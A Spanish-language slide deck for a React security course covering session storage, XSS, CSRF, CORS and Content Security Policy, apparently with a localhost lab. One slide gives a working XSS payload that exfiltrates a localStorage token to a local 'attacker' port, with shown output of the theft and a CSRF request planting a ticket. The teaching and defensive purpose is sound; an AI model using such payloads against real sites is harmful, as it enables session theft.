<!-- _class: lead -->

# S04 - Autenticación y seguridad en el navegador

### React en producción con TypeScript

**Rogelio Arriaga - Raptor Dev Services**

<!--
Bienvenida. Antes de empezar: marco legal y ético (lámina 3). Todo lo ofensivo de hoy se hace en el laboratorio propio, en localhost,
contra el proyecto de ejemplo. Cada equipo abre su copia de "Mesa de ayuda" con npm install hecho.
-->

---

## Agenda del día

| Bloque | Qué hacemos | Tiempo aprox. |
|---|---|---|
| Apertura | Lema, marco legal y ético, objetivos | 25 min |
| Parte 1 | Dónde vive la sesión: cookie `HttpOnly` o token en el navegador | 45 min |
| Parte 2 | XSS: cómo entra, qué se lleva y cómo se frena | 55 min |
| Parte 3 | CSRF y CORS | 30 min |
| Parte 4 | Content Security Policy y otras cabeceras | 45 min |
| Parte 5 | Práctica: robar un token en tu laboratorio y bloquearlo | 80 min |
| Cierre | Errores típicos, tarea y quiz | 20 min |

<!-- Descanso de 10 minutos después de la Parte 2, y otro a la mitad de la práctica. -->

---

## Marco legal y ético: antes que nada

- Todo lo que hacemos hoy es **ofensivo contra nuestro propio laboratorio**: un servidor y una página de ejemplo en `localhost`, y un "atacante" que es un puerto de tu misma computadora.
- **No se prueba nada contra un sistema que no sea tuyo o que no tenga una autorización por escrito** de su dueño. Ni "solo para ver si funciona".
- En México, el acceso sin autorización a sistemas y equipos de informática está tipificado como delito en el Código Penal Federal (capítulo de acceso ilícito a sistemas y equipos de informática, arts. 211 bis 1 a 211 bis 7). El texto vigente está en el sitio de la Cámara de Diputados.
- Lo que aprendes hoy es para **defender**: demostrarte a ti mismo que tu defensa funciona.

> Si no es tu laboratorio y no tienes una autorización escrita, no se toca.

Fuente: Código Penal Federal, Título noveno, arts. 211 bis 1 a 211 bis 7 (diputados.gob.mx, texto vigente); el detalle jurídico se estudia en el curso de legislación de la academia.

<!-- Lee la lámina en voz alta. Pide que cada equipo confirme que su laboratorio escucha solo en 127.0.0.1. -->

---

## El lema de la sesión

> Un token en localStorage es de cualquier script que corra en la página.

- `localStorage` no distingue entre **tu** código y el de una librería comprometida, una extensión o un script inyectado.
- La pregunta no es "¿puede alguien inyectar código?" sino "¿qué se lleva cuando lo logre?".
- Hoy lo medimos: robamos un token en el laboratorio y vemos qué lo frena.

---

## Al terminar puedes

- Elegir dónde guardar la sesión y justificarlo con lo que un XSS puede y no puede hacer.
- Reconocer los tres tipos de XSS y los *sinks* peligrosos de una aplicación React.
- Sanitizar HTML ajeno con DOMPurify y saber cuándo no hace falta (casi siempre).
- Explicar por qué un ataque CSRF funciona o no, según `SameSite`, la cabecera personalizada y el origen.
- Escribir una **Content Security Policy** sin `unsafe-inline` que la aplicación aguante.
- **Demostrar** que tu defensa funciona: robar el token y ver el bloqueo.

---

## Cómo trabajamos

- Proyecto: **Mesa de ayuda** (**Ejemplo ilustrativo**). Datos, correo y contraseña de laboratorio inventados.
- Versiones a noviembre de 2026: React 19.3.1, React Router 8.5.1, DOMPurify 3.4.17, Vite 8.3.8, Playwright 1.65.
- El laboratorio vive en la carpeta `lab/` del proyecto: una página vulnerable a propósito (`vulnerable.html`), un "atacante" local (`atacante.mjs`) y tres scripts de Playwright que lo ejecutan.
- **La regla del curso:** si no lo viste fallar, no lo probaste. Hoy "fallar" significa ver el robo del token y ver el bloqueo.

```bash
npm install
npm run build
PORT=3110 npm run api         # la API y el front construido
PORT=3119 node lab/atacante.mjs   # el "atacante" de laboratorio
```

---

<!-- _class: lead -->

# Parte 1
## Dónde vive la sesión

---

## Qué es una sesión y qué guarda el navegador

1. La persona manda su correo y contraseña.
2. El servidor las verifica y crea una **sesión**: un identificador imposible de adivinar, ligado a un usuario.
3. El navegador debe **presentar ese identificador** en cada petición siguiente.

Dos formas de que el navegador lo guarde y lo presente:

| | Cookie `HttpOnly` | Token en `localStorage` |
|---|---|---|
| Quién lo guarda | El navegador, a petición del servidor (`Set-Cookie`) | Tu JavaScript, con `localStorage.setItem` |
| Quién lo presenta | El navegador, solo, en cada petición al sitio | Tu JavaScript, en `Authorization: Bearer ...` |
| ¿Lo puede leer un script de la página? | **No** | **Sí, cualquiera** |

Fuente: MDN, *Using HTTP cookies* (developer.mozilla.org/docs/Web/HTTP/Guides/Cookies); OWASP, *HTML5 Security Cheat Sheet*, sección Web Storage.

---

## Lo que dicen las fuentes sobre `localStorage`

- OWASP: *"Do not store session identifiers in local storage as the data is always accessible by JavaScript."*
- OWASP: *"A single Cross Site Scripting can be used to steal all the data in these objects."*
- MDN, sobre `HttpOnly`: una cookie con ese atributo **no puede leerse con JavaScript** (por ejemplo, con `Document.cookie`); solo llega al servidor. Esto ayuda a mitigar el XSS.

Es una de las razones por las que la sesión del proyecto es una cookie: lo que el navegador guarda **no está al alcance de `localStorage.getItem`**.

Fuente: OWASP Cheat Sheet Series, *HTML5 Security Cheat Sheet* (cheatsheetseries.owasp.org); MDN, *Using HTTP cookies*. Citas breves, traducidas por el curso en el segundo punto. Leídas el 2026-11-11.

---

## La sesión del proyecto, en una respuesta HTTP

```bash
curl -si -H 'content-type: application/json' \
  -d '{"email":"ana@example.com","password":"clave-de-ejemplo"}' \
  http://127.0.0.1:3110/api/login
```

```text
HTTP/1.1 200 OK
content-type: application/json; charset=utf-8
set-cookie: sid=<valor>; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600

{"usuario":{"id":1,"nombre":"Ana Ejemplo","email":"ana@example.com"}}
```

- El cuerpo **no trae el identificador**: solo el usuario. El navegador guarda la cookie y la manda solo.
- El front no maneja el secreto: `useSesion` solo pregunta `GET /api/me`. Con sesión, responde 200; sin ella, 401, que el hook convierte en `null` ("nadie"), no en error.

Fuente: `server/server.mjs` y `src/features/auth/use-sesion.ts` del proyecto de referencia. Salida real, con el valor de la cookie omitido.

---

## Los atributos de la cookie

| Atributo | Qué hace | En el proyecto |
|---|---|---|
| `HttpOnly` | Los scripts no la leen | Sí |
| `Secure` | Solo viaja por HTTPS | **No en el laboratorio** (http local); **sí en producción** |
| `SameSite=Lax` | No se manda en peticiones de otros sitios, salvo al navegar hacia el sitio | Sí |
| `Path=/` y `Max-Age` | Alcance y duración | `/` y 3600 s |
| Prefijo `__Host-` | Obliga `Secure`, `Path=/` y sin `Domain`: solo se manda al host que la puso | Recomendado en producción |

- Si no se escribe `SameSite`, el navegador la trata como `Lax` (MDN).
- `SameSite=None` exige `Secure`.
- Una cookie de sesión en producción: `Set-Cookie: __Host-sid=...; Secure; HttpOnly; SameSite=Lax; Path=/`.

Fuente: MDN, *Using HTTP cookies*, secciones HttpOnly, Secure, SameSite y prefijo `__Host-`. La línea de producción es un *fragmento*: no corre en el laboratorio por ser HTTP.

<!-- El prefijo __Host- exige Secure, y Secure exige HTTPS: por eso el laboratorio no lo usa. -->

---

## Lo que `HttpOnly` NO hace

`HttpOnly` impide **leer** la cookie. No impide **usarla**.

- Un XSS puede hacer `fetch('/api/tickets')` desde la página de la víctima: el navegador adjunta la cookie solo.
- Mientras la pestaña esté abierta, el atacante actúa **como** la persona. Lo que pierde es la capacidad de llevarse la sesión y usarla después, desde otro lugar.
- Por eso la defensa real contra el robo no es una sola: es **evitar la inyección** (React, sanitizar), **limitar lo que el script inyectado puede hacer** (CSP) y **acotar el daño** (cookie `HttpOnly`).

> Una defensa de una sola capa es una apuesta. Tres capas, una estrategia.

Fuente: MDN, *Using HTTP cookies* (`HttpOnly` ayuda a mitigar el XSS; no impide que el código corra); OWASP, *HTML5 Security Cheat Sheet* (sugiere cookies `httpOnly` en lugar de identificadores en `localStorage`). Lo demostramos en la práctica, paso 3.

---

## ¿Y entonces nunca un token en el navegador?

- Un token en memoria (una variable de JavaScript, no `localStorage`) desaparece al recargar y **sigue** estando al alcance de un script inyectado.
- Hay casos legítimos: una API consumida por una aplicación móvil u otro servidor, no por un navegador.
- Para una SPA que habla con su propio backend, la cookie `HttpOnly` es la opción por omisión de este curso: **lo guarda el navegador, lo manda el navegador, y tu JavaScript no lo ve**.
- El costo: con cookies hay que pensar en CSRF (Parte 3).

*React Application Architecture for Production* (Alickovic, 2026) elige la autenticación basada en cookies para su proyecto (cap. 1) y la implementa en el cap. 7.

Fuente: *React Application Architecture for Production* (Alickovic, 2026), cap. 1, "Authentication: Cookie-based", y cap. 7.

---

<!-- _class: lead -->

# Parte 2
## XSS: cómo entra, qué se lleva y cómo se frena

---

## Tres tipos de XSS

| Tipo | De dónde viene el código | Ejemplo |
|---|---|---|
| **Almacenado** (stored) | De la base de datos, escrito por otra persona | Un comentario con `<img onerror=...>` que ve todo el que abra la página |
| **Reflejado** (reflected) | De la petición actual (URL, formulario) | Un enlace con `?q=<img onerror=...>` que la víctima abre |
| **Basado en DOM** (DOM-based) | De la URL o el almacenamiento, procesado por JavaScript del cliente | `innerHTML = location.search` |

- El servidor ni se entera del tercero: todo ocurre en el navegador.
- Todos terminan igual: **el navegador ejecuta código de otro con los permisos de tu página**.

Fuente: *Web Application Security*, 2.ª ed. (Hoffman, 2023), cap. 10, "XSS Discovery and Exploitation" (Stored XSS, Reflected XSS, DOM-Based XSS).

<!-- La clasificación es la del capítulo del libro; no la parafraseamos de cerca: los ejemplos son los del curso. -->

---

## React escapa por defecto

```tsx {1|3-4|6-7|*}
const ataque = '<img src=x onerror="alert(1)"><b>negritas</b><script>alert(2)</script>';

const html = renderToStaticMarkup(<p>{ataque}</p>);
// <p>&lt;img src=x onerror=&quot;alert(1)&quot;&gt;&lt;b&gt;negritas&lt;/b&gt;...</p>

const html2 = renderToStaticMarkup(<p dangerouslySetInnerHTML={{ __html: ataque }} />);
// contiene onerror="alert(1)": React no escapa nada aquí
```

- Interpolar con llaves (`{valor}`) **convierte el texto en texto**: `<` pasa a `&lt;`. La mayoría del XSS clásico no entra por JSX.
- `dangerouslySetInnerHTML` es la salida de emergencia: inserta el HTML **tal cual**. El nombre es la advertencia.

Fuente: documentación de React, *Common components*, `dangerouslySetInnerHTML` ("Only use `dangerouslySetInnerHTML` with trusted and sanitized data"). Prueba real en `src/shared/ui/html-seguro.test.tsx`, ejecutada con React 19.3.1. *Fragmento* simplificado de esa prueba.

---

## Los sinks: dónde un dato se vuelve código

| Sink | Peligro | Alternativa |
|---|---|---|
| `dangerouslySetInnerHTML` | Ejecuta el HTML que le des | Texto con `{valor}`; si hace falta HTML, sanitizar |
| `element.innerHTML = ...` | Igual | `textContent` (crea un nodo de texto sin analizar HTML) |
| `href={url}` / `src={url}` con datos del usuario | Un `javascript:...` en el atributo | Validar el esquema (`https:`, `http:`) |
| `eval`, `new Function`, `setTimeout("texto")` | Convierte un texto en código | No usarlos |
| `document.write` | Escribe HTML crudo | No usarlo |
| Bibliotecas de Markdown o de gráficas que devuelven HTML | Heredan el riesgo | Sanitizar su salida |

- OWASP: refactoriza para quitar los *sinks* peligrosos y usar `textContent` o `value`.

Fuente: OWASP, *Cross Site Scripting Prevention Cheat Sheet* (secciones sobre sinks inseguros y seguros).

---

## `javascript:` en un enlace

```tsx
renderToStaticMarkup(<a href="javascript:alert(1)">clic</a>);
// <a href="javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')">clic</a>
```

- React 19 **bloquea** un `href` con `javascript:`: lo reemplaza por un código que lanza un error. Lo verificamos con `react-dom` 19.3.1.
- OWASP aclara que ese bloqueo **no sustituye** la validación de URL propia de tu aplicación: valida el esquema de toda URL que venga de un usuario (`http:` y `https:`).

```ts
const esUrlSegura = (valor: string) => {
  try {
    return ['http:', 'https:'].includes(new URL(valor).protocol);
  } catch {
    return false;
  }
};
```

Fuente: prueba `React 19 bloquea un href javascript:` en `src/shared/ui/html-seguro.test.tsx`; OWASP, *XSS Prevention Cheat Sheet*, sección de atributos de URL. `esUrlSegura` es un *fragmento* de ejemplo, no un archivo del proyecto.

---

## Cuando de verdad necesitas HTML: DOMPurify

```tsx {1-3|4-8|9-10|*}
import DOMPurify from 'dompurify';

/** El único lugar de la app que usa dangerouslySetInnerHTML, y siempre después de sanitizar. */
export function HtmlSeguro({ html }: Props) {
  const limpio = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'ul', 'ol', 'li', 'br'],
    ALLOWED_ATTR: [],
  });
  return <div dangerouslySetInnerHTML={{ __html: limpio }} />;
}
```

- DOMPurify 3.4.17 (a noviembre de 2026). OWASP lo recomienda para sanitizar HTML.
- **Lista de permitidos, no de prohibidos**: solo estas etiquetas, **ningún** atributo. Sin `onerror`, sin `href`, sin `src`.
- Un solo componente, un solo lugar: es lo único que la regla de lint (y tu revisión de código) debe dejar usar `dangerouslySetInnerHTML`.

Fuente: `src/shared/ui/html-seguro.tsx`; OWASP, *XSS Prevention Cheat Sheet* ("OWASP recommends DOMPurify for HTML Sanitization"); DOMPurify, documentación de `sanitize` y de las opciones `ALLOWED_TAGS` y `ALLOWED_ATTR` (github.com/cure53/DOMPurify).

---

## Qué hace de verdad DOMPurify (ejecutado)

```tsx
const ataque = '<img src=x onerror="alert(1)"><b>negritas</b><script>alert(2)</script>';
render(<HtmlSeguro html={ataque} />).container.innerHTML;
// '<div><b>negritas</b></div>'

render(<HtmlSeguro html={'<a href="javascript:alert(1)">clic</a><p>texto</p>'} />).container.innerHTML;
// '<div>clic<p>texto</p></div>'
```

- Salida real, de las pruebas del proyecto. La imagen y el `script` desaparecieron; el enlace perdió su atributo y quedó el texto; `<b>` y `<p>` sobrevivieron.
- **Mantén DOMPurify actualizado**: es la pieza que se enfrenta a todos los trucos nuevos del navegador. Sube de versión como cualquier dependencia de seguridad.
- Sanitizar no reemplaza el resto: es una capa.

Fuente: `src/shared/ui/html-seguro.test.tsx`, ejecutado el 2026-11-11 con DOMPurify 3.4.17 y jsdom 31.

---

## Error típico: sanitizar con una expresión regular

```ts
// Mal
const limpio = entrada.replace(/<script.*?>.*?<\/script>/g, '');
```

- No quita `<img onerror=...>`, ni `<svg onload=...>`, ni `<a href="javascript:...">`, ni las variantes con mayúsculas o saltos de línea.
- HTML no es un lenguaje regular: los navegadores aceptan mucho HTML malformado y lo "arreglan" a su manera. Un filtro que lee HTML distinto a como lo lee el navegador es la fuente de los *bypass*.
- El capítulo de ataques de XSS de Hoffman lista técnicas de evasión de filtros (etiquetas malformadas, codificaciones, URL relativas al protocolo, *polyglots*): son la razón por la que se usa una biblioteca mantenida y no un filtro hecho a mano.

Fuente: *Web Application Security*, 2.ª ed. (Hoffman, 2023), cap. 10, secciones sobre "Bypassing Filters"; cap. 28, "Sanitizing User Input". *Fragmento*.

---

## La demostración: robar un token (en el laboratorio)

La página `lab/vulnerable.html` (hecha a propósito vulnerable) tiene dos defectos:

1. Guarda el token de sesión en `localStorage`.
2. Pinta el parámetro `?q=` con `innerHTML`.

```js
const q = new URLSearchParams(location.search).get('q');
if (q !== null) {
  // DEFECTO: el texto de la URL entra como HTML.
  document.getElementById('resultados').innerHTML = 'Resultados para: ' + q;
}
```

El "atacante" es `lab/atacante.mjs`: un puerto local que anota lo que le llega. La carga:

```html
<img src=x onerror="fetch('http://127.0.0.1:3119/robo?token='+encodeURIComponent(localStorage.getItem('token')))">
```

`<img src=x>` falla al cargar, y el navegador ejecuta el `onerror`.

Fuente: `lab/vulnerable.js` y `lab/atacante.mjs` del proyecto de referencia. **Ejemplo ilustrativo**, solo en localhost.

---

## Lo que el atacante recibe (salida real)

```bash
node lab/probar-xss.mjs token
```

```text
estado: Sesión con token en localStorage
[atacante] GET /robo?token=t2V-eJl1H2b42vOPbmoIxNj7xqMunN8c
```

Con la sesión en **cookie `HttpOnly`** (`node lab/probar-xss.mjs cookie`), con la misma inyección:

```text
estado: Sesión con cookie HttpOnly
[atacante] GET /robo?cookie=
```

- `document.cookie` no ve la cookie: llega vacío. **Eso** es lo que `HttpOnly` compra.
- Y la advertencia: con `node lab/probar-xss.mjs datos` el script inyectado hace `fetch('/api/tickets')`, y la cookie viaja sola. El atacante recibe los datos de la víctima (`/robo?datos={"datos":[{"id":1,"titulo":"La impresora del piso 2 no responde"...`).

Fuente: salida real de `lab/probar-xss.mjs` el 2026-11-11 (Chromium headless, Playwright 1.65). Los tokens son de un servidor de laboratorio efímero.

<!-- Aquí se para y se pregunta al grupo: ¿entonces HttpOnly no sirve? Sirve para que el robo no se pueda repetir desde otro lugar. Lo que sigue (CSP) es lo que frena la salida de los datos. -->

---

<!-- _class: lead -->

# Parte 3
## CSRF y CORS

---

## CSRF: usar tu sesión desde otro sitio

- La víctima tiene sesión en `mesa.example` (cookie). Visita otro sitio que contiene un formulario que **envía** un POST a `mesa.example`.
- El navegador adjunta la cookie, porque la petición va a ese sitio. El servidor ve una sesión válida.
- El atacante **no lee** la respuesta: solo logra una acción (crear, cambiar, borrar).

Cuatro defensas que se apilan:

1. **`SameSite`** en la cookie.
2. **Cabecera personalizada** en cada escritura (`X-Requested-By`).
3. **Verificar el `Origin`** (o los metadatos de la petición) en el servidor.
4. Un **token anti-CSRF** (sincronizador), cuando se necesita más.

Fuente: OWASP, *Cross-Site Request Forgery Prevention Cheat Sheet*; *Web Application Security*, 2.ª ed. (Hoffman, 2023), cap. 11 (CSRF) y cap. 29 (defensa: verificación de cabeceras, tokens CSRF).

---

## `SameSite` y "mismo sitio": la trampa de los puertos

- `SameSite=Lax`: la cookie **no** se manda en peticiones iniciadas desde otro sitio, salvo cuando la persona navega hacia el sitio con un enlace.
- "Sitio" (*site*) es el dominio registrable. **El puerto no cuenta**: `http://127.0.0.1:3110` y `http://127.0.0.1:3119` son el **mismo sitio**, aunque no el mismo **origen**.
- Consecuencia: `SameSite` **no** protege contra un atacante que sirve su página desde otro puerto, o desde otro subdominio del mismo dominio.
- OWASP lo califica de **defensa en profundidad**: *"does not replace a proper CSRF defense in most deployments"*. Además, `Lax` solo cubre los métodos no seguros: un `GET` que modifique datos sigue expuesto.

Fuente: MDN, glosario *Site* ("the port number is ignored when determining the site") y *Origin*; OWASP, *CSRF Prevention Cheat Sheet*, sección SameSite.

---

## La cabecera personalizada: el navegador hace el trabajo

```ts
headers: {
  accept: 'application/json',
  'x-requested-by': 'mesa-de-ayuda',
  ...(cuerpo === undefined ? {} : { 'content-type': 'application/json' }),
},
```

```js
// en el servidor de laboratorio
if (EXIGE_CABECERA && !['GET', 'HEAD'].includes(metodo) && !req.headers['x-requested-by']) {
  return json(res, 403, { codigo: 'csrf', mensaje: 'Falta la cabecera X-Requested-By.' });
}
```

- Un formulario HTML **no puede** agregar cabeceras propias. Con `fetch` sí, pero una cabecera que no es "segura" obliga a una petición previa (*preflight*, un `OPTIONS`) y el servidor ajeno no la autoriza: el navegador bloquea el envío.
- OWASP la considera apta para APIs y AJAX, con salvedades: depende de CORS bien configurado y conviene **no aceptar** `text/plain` como tipo de contenido de una API.

Fuente: `src/shared/api/client.ts`, `server/server.mjs`; MDN, *CORS* (peticiones simples y *preflight*); OWASP, *CSRF Prevention Cheat Sheet*, "Custom Request Headers".

<!-- Nota: el servidor de laboratorio lee el cuerpo como JSON sin revisar su Content-Type (una simplificación del laboratorio). Así se ve que lo que detiene el ataque es la cabecera. OWASP aconseja rechazar text/plain en una API. -->

---

## Tres experimentos de CSRF (salida real)

Un formulario de otro puerto manda un POST `text/plain` con un JSON de ticket. La víctima ya tiene sesión.

| Experimento | Cookie `SameSite=Lax` | Cabecera obligatoria | Respuesta de la API |
|---|---|---|---|
| A. Otro **sitio** (`localhost` frente a `127.0.0.1`) | no se manda | apagada | `{"codigo":"sin-sesion","mensaje":"Inicia sesión."}` |
| B. Mismo sitio, otro puerto | se manda | **apagada** | `{"id":4,"titulo":"Ticket plantado por otro sitio",...}` |
| C. Mismo sitio, otro puerto | se manda | **encendida** | `{"codigo":"csrf","mensaje":"Falta la cabecera X-Requested-By."}` |

- **A** lo detiene `SameSite`. **B** es el ataque que funciona: el ticket quedó creado. **C** lo detiene la cabecera.
- Cada capa tapa un hueco que la otra deja.

Fuente: salida real de `node lab/probar-csrf.mjs localhost|127.0.0.1` el 2026-11-11, con `CSRF=off` en A y B. Laboratorio local.

---

## CSRF y XSS: el que cae primero tumba al otro

- Si hay XSS, el script corre **dentro** del origen de la aplicación: puede enviar peticiones con la cabecera correcta, leer el token anti-CSRF y todo lo demás.
- OWASP: *"Remember that Cross-Site Scripting (XSS) can defeat all CSRF mitigation techniques!"*
- El orden de trabajo: **primero no tener XSS**, luego CSRF.

---

## CORS en una línea (y lo que no es)

- **CORS** es la política del navegador que decide qué sitio **lee** la respuesta de otro. No es una defensa del servidor: el navegador lo hace cumplir.
- Una petición "simple" (por ejemplo, un `POST` con `text/plain`) **llega al servidor** aunque CORS no la deje leer: por eso no protege contra CSRF por sí solo.
- Con credenciales (cookies), el servidor no puede responder `Access-Control-Allow-Origin: *`: debe nombrar un origen explícito y mandar `Access-Control-Allow-Credentials: true`.
- Regla práctica: la SPA y la API en el **mismo origen** (la API detrás del mismo dominio, o un proxy). No tendrás CORS que configurar mal. Es lo que hace el proyecto con el proxy de Vite y con el servidor de laboratorio.

Fuente: MDN, *Cross-Origin Resource Sharing (CORS)*: secciones sobre peticiones simples, *preflight* y peticiones con credenciales.

---

<!-- _class: lead -->

# Parte 4
## Content Security Policy y otras cabeceras

---

## Qué es una CSP

- Una cabecera de respuesta, `Content-Security-Policy`, que dice **desde dónde** puede cargar y ejecutar cosas la página.
- Es *"mainly used as a defense against cross-site scripting"* (MDN) y es **defensa en profundidad**: no reemplaza sanitizar la entrada.
- Una vez que defines `default-src` o `script-src`, **el JavaScript en línea queda bloqueado**: `<script>...</script>`, atributos como `onerror=` y URL `javascript:`.
- Las directivas más usadas:

| Directiva | Controla |
|---|---|
| `default-src` | Lo que no tiene directiva propia (es el respaldo) |
| `script-src` | De dónde sale el JavaScript |
| `connect-src` | A dónde pueden conectarse `fetch`, XHR y WebSocket |
| `img-src`, `style-src`, `font-src` | Imágenes, hojas de estilo, tipografías |
| `object-src` | `<object>` y `<embed>`; se pone `'none'` |
| `base-uri` | Qué puede ir en `<base>`; `'none'` |
| `frame-ancestors` | Quién puede incrustar tu página en un `iframe`; `'none'` |

Fuente: MDN, *Content Security Policy (CSP)*.

---

## La CSP del proyecto

```text {1|2|3|4-5|6-9|*}
default-src 'self';
script-src 'self';
style-src 'self';
img-src 'self' data:;
connect-src 'self';
object-src 'none';
base-uri 'none';
form-action 'self';
frame-ancestors 'none'
```

- Todo del mismo origen, **ninguna** excepción en línea.
- `connect-src 'self'`: aunque un script corriera, **no puede mandar datos a otro servidor**.
- `form-action 'self'` frena los formularios que envían a otro destino. `frame-ancestors 'none'` evita el *clickjacking*.
- Un build de Vite genera el HTML con un solo `<script type="module" src="/assets/...">`: no hay código en línea que bloquear, y la aplicación corre igual.

Fuente: MDN, *CSP*; `server/server.mjs` (variable `CSP`). Verificado: las tres pruebas E2E del proyecto pasan con esta política activa (Playwright 1.65).

<!-- La política se pasa al servidor con la variable CSP. En producción la pone el servidor web o el proxy; el HTML del build es estático. -->

---

## Ver el bloqueo: lo que dice Chromium (salida real)

Con la CSP `script-src 'self'` y la misma inyección:

```text
estado: Sesión con token en localStorage
[consola] Executing inline event handler violates the following Content Security Policy directive 'script-src 'self''. Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution. Note that hashes do not apply to event handlers, style attributes and javascript: navigations unless the 'unsafe-hashes' keyword is present. The action has been blocked.
```

- El atacante **no recibió nada**.
- El mensaje es la herramienta de depuración: dice qué directiva bloqueó qué y qué opciones existen.
- Y una segunda capa. Con una CSP **más débil** (`script-src 'self' 'unsafe-inline'; connect-src 'self'`) el script inyectado **sí** corre, pero:

```text
[consola] Connecting to 'http://127.0.0.1:3119/robo?token=...' violates the following Content Security Policy directive: "connect-src 'self'". The action has been blocked.
```

Fuente: salida real de `lab/probar-xss.mjs token` con `CSP` en el servidor, Chromium 158 (Playwright 1.65), 2026-11-11. El texto exacto del mensaje depende del navegador y su versión.

---

## Sin `unsafe-inline`: nonce o hash cuando haga falta un script en línea

- **Hash:** el servidor calcula el SHA-256 (o 384, 512) del contenido del script y lo declara en la política. Solo corre **ese** texto exacto.
- **Nonce:** un valor distinto en **cada respuesta**, imposible de adivinar, en la cabecera y en la etiqueta del script.
- MDN: *"Developers should avoid 'unsafe-inline', because it defeats much of the purpose of having a CSP."* Si una directiva trae nonce o hash, el navegador ignora `unsafe-inline`.
- Los hashes **no aplican** a los manejadores de eventos (`onclick=`) ni a atributos `style`, salvo con `'unsafe-hashes'`: la solución es mover ese código a un archivo.

Fuente: MDN, *CSP*, secciones sobre nonce, hash y `unsafe-inline`; el mensaje de Chromium de la lámina anterior para los manejadores de eventos.

---

## El hash, probado

`lab/hash.html` tiene un script en línea. Se calcula su hash y se usa como política:

```bash
python3 -c "import hashlib,base64,re;c=re.search(r'<script>(.*?)</script>',open('lab/hash.html').read(),re.S).group(1);print('sha256-'+base64.b64encode(hashlib.sha256(c.encode()).digest()).decode())"
# sha256-YlWwrlpGCFWzWHTa32ZSw2o+wUuCSf9pJ4T5IfCwMa4=
CSP="script-src 'sha256-YlWwrlpGCFWzWHTa32ZSw2o+wUuCSf9pJ4T5IfCwMa4='" PORT=3110 node server/server.mjs
node lab/probar-hash.mjs
```

```text
título: ejecutado
```

Se agrega un comentario al script (`// editado`), con la **misma** política:

```text
[consola] Executing inline script violates the following Content Security Policy directive 'script-src 'sha256-YlWwrlpGCFWzWHTa32ZSw2o+wUuCSf9pJ4T5IfCwMa4=''. ...
título: sin ejecutar
```

Un solo carácter cambia el hash: el navegador ya no lo acepta.

Fuente: salida real de `lab/probar-hash.mjs`, 2026-11-11.

---

## Desplegar una CSP sin romper la aplicación

1. **Primero en modo reporte:** `Content-Security-Policy-Report-Only` no bloquea; solo avisa de lo que **habría** bloqueado.
2. Recorre la aplicación completa y mira la consola (o el punto de reporte).
3. Arregla lo que aparezca: mover scripts en línea a archivos, listar el origen de una tipografía o una imagen legítima.
4. Cambia a `Content-Security-Policy`.

- La política en una etiqueta `<meta>` **no admite** todas las funciones (por ejemplo, el modo de solo reporte no puede entregarse por `<meta>`). Se entrega por **cabecera**.
- Cada origen de terceros que agregas a `script-src` es un tercero que puede ejecutar código en tu página: la lista debe ser corta.

Fuente: MDN, *CSP*, secciones sobre `Content-Security-Policy-Report-Only` y entrega por `<meta>`.

---

## Otras cabeceras de la respuesta HTML

| Cabecera | Valor | Qué hace |
|---|---|---|
| `X-Content-Type-Options` | `nosniff` | El navegador no adivina el tipo: un script o una hoja de estilo con el MIME equivocado se bloquea |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Qué parte de la URL se manda en `Referer`. Es el valor por omisión de los navegadores modernos; declararlo hace explícita la intención |
| `frame-ancestors` (dentro de la CSP) | `'none'` | Nadie incrusta tu página en un `iframe` |

```text
x-content-type-options: nosniff
referrer-policy: strict-origin-when-cross-origin
cache-control: no-cache
```

Fuente: MDN, `X-Content-Type-Options` y `Referrer-Policy` (el valor por omisión es `strict-origin-when-cross-origin`, a noviembre de 2026); MDN, CSP. Salida real de `curl -I` al servidor de laboratorio.

---

## Error típico: guardar secretos en variables `VITE_`

- Todo lo que empieza con `VITE_` **se incrusta en el JavaScript** que baja el navegador. Cualquiera lo ve en las herramientas de desarrollo.
- Una "clave secreta" en una variable `VITE_` no es secreta: es pública con trabajo extra.
- Lo que sí va: la URL de la API, un identificador público. Lo secreto vive en el **servidor**.
- Lo mismo con `localStorage`: no guardes contraseñas, tokens ni datos personales; el borrador de la sesión 3 guarda solo un título.

Fuente: nota `06-frontend/01-variables-entorno-vite.md`; documentación de Vite, *Env Variables and Modes* (solo las variables con prefijo `VITE_` se exponen al código del cliente).

---

<!-- _class: lead -->

# Parte 5
## Práctica: robar un token en tu laboratorio y bloquearlo

---

## Lo que haremos (80 minutos)

1. Levantar el laboratorio: API, página vulnerable y el "atacante" local. Confirmar que **solo escuchan en `127.0.0.1`**.
2. **Robar** un token de `localStorage` con un XSS reflejado, y ver al atacante recibirlo.
3. Repetir con la sesión en **cookie `HttpOnly`**: ver `document.cookie` vacío, y comprobar que aun así los datos salen.
4. Activar una **CSP** y ver el bloqueo en la consola; probar una segunda capa con `connect-src`.
5. **CSRF**: los tres experimentos A, B y C.
6. DOMPurify y las pruebas de React.

Entrega: `evidencia-s04.md` con la salida real de cada paso y las respuestas.

- Documento de la práctica: `practica.md` de esta carpeta.

<!-- Recuerda el marco legal de la lámina 3. Circula: el paso 3 es el que más sorprende, porque la cookie no basta. -->

---

<!-- _class: lead -->

# Cierre

---

## Errores típicos de la sesión

| Error | Cómo se ve | Cómo se evita |
|---|---|---|
| Token de sesión en `localStorage` | Un XSS se lo lleva y lo usa desde otro lugar | Cookie `HttpOnly` |
| Creer que `HttpOnly` basta | El script inyectado aun así lee los datos de la víctima | Evitar la inyección y limitar con CSP |
| `dangerouslySetInnerHTML` con datos de usuario | `<img onerror>` ejecutado | Texto con llaves, o `HtmlSeguro` |
| Sanitizar con una regex | Un truco de evasión pasa el filtro | DOMPurify con lista de permitidos |
| `SameSite` como única defensa de CSRF | Un sitio del mismo dominio registrable la salta | Cabecera personalizada y `Origin` |
| `unsafe-inline` "para que funcione" | La CSP no protege del XSS | Archivos externos, hash o nonce |
| CSP directa a producción | Se rompe una pantalla | Primero `Report-Only` |

---

## Lo que viene en la tarea

- Escribir la **CSP de tu aplicación, sin `unsafe-inline`**, y demostrar que funciona.
- Primero en modo reporte; luego en modo bloqueo con tu aplicación recorrida completa.
- Demostrar con un script inyectado que la política lo bloquea (como en el paso 4).
- Decidir dónde vive la sesión de **tu** proyecto y justificarlo.

> Un token en localStorage es de cualquier script que corra en la página.

Detalle en `tarea.md`.

---

## Lecturas y libros

**Obligatorias**

- `dev-notes/10-cloud/07-seguridad-web.md`, secciones A02 (cabeceras), A05 (inyección), A07 (tokens) y CORS.
